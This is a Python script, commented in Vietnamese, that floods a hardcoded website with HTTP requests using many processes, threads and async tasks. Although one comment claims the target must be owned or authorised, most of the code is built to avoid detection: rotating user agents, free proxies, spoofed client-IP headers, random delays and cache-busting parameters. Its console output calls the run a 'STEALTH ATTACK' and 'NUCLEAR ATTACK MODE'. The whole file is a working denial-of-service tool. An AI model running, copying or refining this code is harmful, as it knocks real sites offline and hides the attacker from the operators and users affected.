import requests
import threading
import time
import signal
import sys
import random
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
import multiprocessing
from urllib.parse import urljoin
import itertools

# URL của máy chủ cần kiểm tra (phải là máy chủ bạn sở hữu hoặc có sự cho phép)
TARGET_URL = "https://tjkw11.com/"
NUM_THREADS = 50  # Giảm threads để tránh bị phát hiện
MAX_WORKERS = 100  # Giảm workers
ASYNC_THREADS = 10  # Giảm async threads
CONCURRENT_REQUESTS = 20  # Giảm concurrent requests

# Cấu hình để tránh bị block
USE_PROXIES = True  # Bật/tắt sử dụng proxy
USE_DELAYS = True   # Bật/tắt delay ngẫu nhiên
MIN_DELAY = 0.1     # Delay tối thiểu (giây)
MAX_DELAY = 2.0     # Delay tối đa (giây)
ROTATE_IP_HEADERS = True  # Bật/tắt giả mạo IP headers

# Danh sách User-Agent để tránh bị phát hiện (mở rộng)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
]

# Danh sách proxy miễn phí (cần cập nhật thường xuyên)
FREE_PROXIES = [
    # HTTP Proxies
    'http://103.149.162.194:80',
    'http://103.149.162.195:80',
    'http://185.162.231.106:80',
    'http://185.162.231.107:80',
    'http://103.152.112.162:80',
    'http://103.152.112.145:80',
    'http://194.182.163.117:3128',
    'http://194.182.163.118:3128',
    # SOCKS5 Proxies
    'socks5://103.149.162.194:1080',
    'socks5://185.162.231.106:1080',
    'socks5://103.152.112.162:1080',
]

# Danh sách IP giả để thêm vào headers
FAKE_IPS = [
    '192.168.1.{}'.format(random.randint(1, 254)),
    '10.0.0.{}'.format(random.randint(1, 254)),
    '172.16.0.{}'.format(random.randint(1, 254)),
    '203.0.113.{}'.format(random.randint(1, 254)),
    '198.51.100.{}'.format(random.randint(1, 254)),
    '8.8.8.{}'.format(random.randint(1, 254)),
    '1.1.1.{}'.format(random.randint(1, 254)),
]

# Iterator để xoay proxy
proxy_cycle = itertools.cycle(FREE_PROXIES) if FREE_PROXIES else None

# Các đường dẫn phổ biến để tấn công
ATTACK_PATHS = [
    '/',
    '/index.html',
    '/index.php',
    '/home',
    '/about',
    '/contact',
    '/login',
    '/admin',
    '/wp-admin',
    '/api',
    '/search',
    '/products',
    '/services',
]

# Các phương thức HTTP
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Biến để kiểm soát việc dừng các luồng
stop_threads = False
request_count = 0
request_lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_threads
    print('\nĐang dừng chương trình...')
    stop_threads = True
    sys.exit(0)

def get_random_headers():
    """Tạo headers ngẫu nhiên để tránh bị phát hiện"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-US,en;q=0.5',
            'vi-VN,vi;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
        ]),
        'Accept-Encoding': random.choice([
            'gzip, deflate, br',
            'gzip, deflate',
            'gzip',
        ]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Pragma': 'no-cache',
        'DNT': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
    }
    
    # Thêm headers giả mạo IP nếu được bật
    if ROTATE_IP_HEADERS:
        fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ip_headers = random.choice([
            {'X-Forwarded-For': fake_ip},
            {'X-Real-IP': fake_ip},
            {'X-Originating-IP': fake_ip},
            {'X-Remote-IP': fake_ip},
            {'X-Client-IP': fake_ip},
            {'CF-Connecting-IP': fake_ip},
            {'True-Client-IP': fake_ip},
            {'X-Forwarded-For': fake_ip, 'X-Real-IP': fake_ip},
        ])
        headers.update(ip_headers)
    
    # Thêm referer ngẫu nhiên
    if random.choice([True, False]):
        referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://www.twitter.com/',
            'https://www.instagram.com/',
            'https://www.linkedin.com/',
        ]
        headers['Referer'] = random.choice(referers)
    
    return headers

def get_random_proxy():
    """Lấy proxy ngẫu nhiên từ danh sách"""
    if not USE_PROXIES or not FREE_PROXIES:
        return None
    
    try:
        proxy_url = next(proxy_cycle)
        if proxy_url.startswith('http://'):
            return {'http': proxy_url, 'https': proxy_url}
        elif proxy_url.startswith('socks5://'):
            return {'http': proxy_url, 'https': proxy_url}
        return None
    except:
        return None

def apply_delay():
    """Áp dụng delay ngẫu nhiên nếu được bật"""
    if USE_DELAYS:
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        time.sleep(delay)

def send_request_sync():
    """Gửi request đồng bộ với session để tái sử dụng kết nối"""
    global request_count
    session = requests.Session()
    
    # Tối ưu session
    session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50))
    session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50))
    
    while not stop_threads:
        try:
            # Áp dụng delay trước khi gửi request
            apply_delay()
            
            headers = get_random_headers()
            proxies = get_random_proxy()
            
            # Thêm tham số ngẫu nhiên để tránh cache
            params = {
                't': int(time.time() * 1000), 
                'r': random.randint(1, 999999),
                'cache_bust': random.randint(1, 999999),
                'v': random.choice(['1.0', '2.0', '3.0']),
                'ref': random.randint(1, 9999)
            }
            
            # Random method và path
            method = random.choice(HTTP_METHODS)
            path = random.choice(ATTACK_PATHS)
            url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
            
            # Cấu hình request với proxy và timeout dài hơn
            request_kwargs = {
                'headers': headers,
                'params': params,
                'timeout': (5, 10),  # (connect_timeout, read_timeout)
                'allow_redirects': True,
                'verify': False,  # Bỏ qua SSL verification
            }
            
            if proxies:
                request_kwargs['proxies'] = proxies
            
            if method == 'GET':
                response = session.get(url, **request_kwargs)
            elif method == 'POST':
                data = {
                    'data': random.randint(1, 999999),
                    'action': random.choice(['search', 'login', 'submit', 'update']),
                    'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
                }
                request_kwargs['data'] = data
                response = session.post(url, **request_kwargs)
            elif method == 'HEAD':
                response = session.head(url, **request_kwargs)
            else:  # OPTIONS
                response = session.options(url, **request_kwargs)
                
            with request_lock:
                request_count += 1
                if request_count % 25 == 0:  # Giảm spam console
                    proxy_info = f" via {list(proxies.values())[0] if proxies else 'direct'}" if proxies else ""
                    print(f"🔥 Request #{request_count} | {method} {path} | Status: {response.status_code}{proxy_info}")
                    
        except requests.exceptions.ProxyError:
            # Proxy lỗi, thử lại với proxy khác hoặc direct
            continue
        except requests.exceptions.Timeout:
            # Timeout, bỏ qua
            continue
        except requests.exceptions.RequestException:
            # Lỗi khác, bỏ qua
            continue
        except Exception:
            # Lỗi không xác định
            continue

async def send_request_async(session):
    """Gửi request bất đồng bộ để tăng hiệu suất"""
    global request_count
    try:
        # Áp dụng delay async
        if USE_DELAYS:
            await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
        
        headers = get_random_headers()
        params = {
            't': int(time.time() * 1000), 
            'r': random.randint(1, 999999),
            'cache_bust': random.randint(1, 999999),
            'async': '1'
        }
        
        # Random path cho async requests
        path = random.choice(ATTACK_PATHS)
        url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
        
        # Cấu hình timeout cho async
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        
        async with session.get(url, headers=headers, params=params, timeout=timeout, ssl=False) as response:
            with request_lock:
                request_count += 1
                if request_count % 30 == 0:
                    print(f"⚡ Async Request #{request_count} | {path} | Status: {response.status}")
    except asyncio.TimeoutError:
        # Timeout, bỏ qua
        pass
    except aiohttp.ClientError:
        # Lỗi client, bỏ qua
        pass
    except Exception:
        # Lỗi khác, bỏ qua
        pass

async def async_attack():
    """Tấn công bất đồng bộ với nhiều request cùng lúc"""
    connector = aiohttp.TCPConnector(
        limit=200,  # Giảm giới hạn kết nối để tránh bị phát hiện
        limit_per_host=200,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True,
        ssl=False  # Tắt SSL verification
    )
    timeout = aiohttp.ClientTimeout(total=10, connect=5)  # Tăng timeout
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_threads:
            # Tạo nhiều task cùng lúc nhưng ít hơn để tránh bị phát hiện
            tasks = []
            for _ in range(CONCURRENT_REQUESTS):
                if stop_threads:
                    break
                task = asyncio.create_task(send_request_async(session))
                tasks.append(task)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # Thêm delay nhỏ giữa các batch để tránh bị phát hiện
            if USE_DELAYS:
                await asyncio.sleep(random.uniform(0.1, 0.5))

def run_async_attack():
    """Chạy tấn công bất đồng bộ trong thread riêng"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(async_attack())
    except Exception as e:
        pass
    finally:
        loop.close()

def process_attack():
    """Chạy attack trong process riêng"""
    global stop_threads
    threads = []
    
    # Tạo threads trong process này
    for i in range(NUM_THREADS // 4):  # Chia threads cho các process
        thread = threading.Thread(target=send_request_sync)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Chờ cho đến khi dừng
    while not stop_threads:
        time.sleep(1)

def main():
    global stop_threads
    
    # Đăng ký signal handler để bắt Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    cpu_count = multiprocessing.cpu_count()
    print(f"🚀 Starting STEALTH ATTACK on {TARGET_URL}")
    print("�💥💥 NUCLEAR ATTACK MODE 💥💥💥")
    print(f"   - {cpu_count} CPU cores detected")
    print(f"   - {NUM_THREADS} synchronous threads (NO DELAY)")
    print(f"   - {ASYNC_THREADS} async threads")
    print(f"   - {CONCURRENT_REQUESTS} concurrent requests per async thread")
    print(f"   - Multiple HTTP methods (GET, POST, HEAD, OPTIONS)")
    print(f"   - Multiple attack paths")
    print(f"   - Total potential: {NUM_THREADS + (ASYNC_THREADS * CONCURRENT_REQUESTS)} concurrent requests")
    print("   - Random headers and parameters")
    print("   - Optimized connection pooling")
    print("   - Maximum timeout reduction")
    print("   - Multi-process architecture")
    print("⚠️⚠️⚠️  NUCLEAR MODE - Press Ctrl+C to stop... ⚠️⚠️⚠️")
    print("=" * 80)
    
    threads = []
    processes = []
    
    # Tạo multiple processes để tận dụng tất cả CPU cores
    print(f"🚀 Starting {cpu_count} attack processes...")
    for i in range(cpu_count):
        process = multiprocessing.Process(target=process_attack, name=f"AttackProcess-{i+1}")
        process.daemon = True
        processes.append(process)
        process.start()
    
    # Tạo các thread đồng bộ với số lượng lớn
    print(f"🔥 Starting {NUM_THREADS} synchronous attack threads...")
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_request_sync, name=f"SyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Tạo nhiều thread bất đồng bộ
    print(f"⚡ Starting {ASYNC_THREADS} asynchronous attack threads...")
    for i in range(ASYNC_THREADS):
        thread = threading.Thread(target=run_async_attack, name=f"AsyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    print(f"✅ Started {len(processes)} processes and {len(threads)} threads")
    print(f"💀 TOTAL ATTACK VECTORS: {len(processes) * (NUM_THREADS // 4) + len(threads)}")
    
    # Thống kê real-time
    start_time = time.time()
    last_count = 0
    
    try:
        while not stop_threads:
            time.sleep(1)  # Cập nhật nhanh hơn
            current_time = time.time()
            elapsed = current_time - start_time
            current_count = request_count
            rps = (current_count - last_count) / 1  # Requests per second
            
            print(f"� NUCLEAR STATS: {current_count} requests | RPS: {rps:.0f} | Time: {elapsed:.1f}s | 🔥ATTACKING🔥")
            last_count = current_count
            
    except KeyboardInterrupt:
        print("\n🛑 NUCLEAR SHUTDOWN INITIATED...")
        stop_threads = True
    
    print("⏳ Terminating all attack vectors...")
    
    # Terminate processes
    for process in processes:
        if process.is_alive():
            process.terminate()
    
    time.sleep(3)
    
    # Thống kê cuối
    total_time = time.time() - start_time
    avg_rps = request_count / total_time if total_time > 0 else 0
    
    print("=" * 80)
    print(f"� NUCLEAR ATTACK COMPLETED 💀")
    print(f"   Total Requests Fired: {request_count}")
    print(f"   Total Attack Time: {total_time:.2f} seconds")
    print(f"   Average RPS: {avg_rps:.2f}")
    print(f"   Peak Performance: {max(rps if 'rps' in locals() else 0, avg_rps):.2f} RPS")
    print("🏁 Target should be experiencing severe load...")

if __name__ == "__main__":
    main()